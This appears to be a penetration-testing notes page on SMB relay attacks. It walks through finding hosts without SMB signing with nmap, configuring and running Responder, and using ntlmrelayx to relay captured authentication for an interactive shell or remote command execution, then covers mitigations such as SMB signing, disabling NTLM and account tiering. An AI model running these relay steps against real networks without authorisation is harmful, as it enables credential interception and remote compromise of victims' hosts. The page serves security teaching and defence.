# ❄️ SMB Relay Attacks

### **Understanding SMB Relay Attacks:**

SMB Relay Attacks exploit the absence of SMB signing enforcement, a security feature that safeguards data integrity during transit. When SMB signing is disabled on a target machine, attackers can intercept and relay authentication requests to gain unauthorized access. This attack is effective when the relayed user has administrative privileges on the target.

<figure><img src="https://images.contentstack.io/v3/assets/blt36c2e63521272fdc/blt2a93d95cba77be1e/5dfcef9c41f23743155b847a/smbrelaypic2-relaydiagram.png" alt=""><figcaption></figcaption></figure>

### **Commands Breakdown:**

Let's break down the commands used in this SMB Relay Attacks documentation:

### **1. Identifying Hosts without SMB Signing:**

```bash
nmap --script=smb2-security-mode.nse -p445 <target_IP>
```

* **nmap:** A network scanning tool.
* **--script=smb2-security-mode.nse:** Nmap script to check SMB signing status.
* **-p445:** Specifies the port to scan (SMB port).
* **\<target\_IP>:** IP address of the target machine.

This command scans for hosts and checks if SMB signing is disabled or not enforced.

### **2. Modifying Responder Configuration:**

```bash
sudo mousepad /etc/responder/Responder.conf
```

* **sudo mousepad:** Opens the Responder configuration file with elevated privileges.
* **/etc/responder/Responder.conf:** Path to the Responder configuration file.

Edit the Responder configuration to disable SMB and HTTP, ensuring captured hashes are relayed.

### **3. Running Responder and NTLMRelayx:**

**Running Responder:**

```bash
sudo responder -I eth0 -wrf
```

* **sudo responder:** Launches Responder with elevated privileges.
* **-I eth0:** Specifies the network interface.
* **-wrf:** Options for Responder (analyze, poison, and fingerprint).

**Running NTLMRelayx:**

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

* **sudo ntlmrelayx.py:** Executes NTLMRelayx with elevated privileges.
* **-tf targets.txt:** Specifies the target file containing identified hosts.
* **-smb2support:** Enables SMB2 support for relay.

This command relays captured hashes from Responder to the target machines listed in the target file.

**Additional Options:**

**Interactive Shell:**

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -i
```

* **-i:** Initiates an interactive shell on the target.

**Run a Command:**

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

* **-c "whoami":** Executes the specified command on the target.

Very good documentation about this attack and pentest in general: [https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adversary-in-the-middle/smb-relay](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adversary-in-the-middle/smb-relay)

## Mitigation Strategies for SMB Relay Attacks

Mitigating SMB Relay Attacks involves implementing various strategies to enhance the security of your infrastructure. Let's explore some common mitigation techniques and discuss their pros and cons:

### 1. Enable SMB Signing on All Devices

#### Pros:

* **Data Integrity:** SMB signing ensures the integrity of data during transfer, preventing unauthorized modifications.
* **Authentication Assurance:** It enhances authentication by confirming the legitimacy of the parties involved in the communication.

#### Cons:

* **Resource Overhead:** Enabling SMB signing may impose a slight performance overhead on the system.
* **Compatibility Concerns:** Some legacy devices or applications might face compatibility issues with SMB signing.

### 2. Disable NTLM Authentication on the Network

#### Pros:

* **Security Enhancement:** Disabling NTLM reduces the risk of relay attacks, as NTLM is a common target for exploitation.
* **Forces Use of Kerberos:** Encourages the use of more secure authentication mechanisms like Kerberos.

#### Cons:

* **Compatibility Issues:** Some older systems or applications may rely on NTLM, causing compatibility problems.
* **Potential Disruption:** Disabling NTLM authentication abruptly can disrupt services that depend on it.

### 3. Account Tiering

#### Pros:

* **Least Privilege:** Assigning different access levels based on job roles limits the impact of compromised accounts.
* **Granular Control:** Enables fine-grained control over user permissions, reducing the attack surface.

#### Cons:

* **Administrative Overhead:** Managing and maintaining tiered account structures can be administratively demanding.
* **User Training:** Requires proper user education to avoid privilege-related issues.

### 4. Local Admin Restriction

#### Pros:

* **Mitigates Lateral Movement:** Restricting local admin rights prevents attackers from easily moving laterally within the network.
* **Limits Privilege Escalation:** Reduces the risk of privilege escalation through compromised local admin credentials.

#### Cons:

* **User Convenience:** Users may face inconvenience when they need elevated privileges for legitimate tasks.
* **Application Compatibility:** Some applications may require local admin rights, potentially causing compatibility issues.
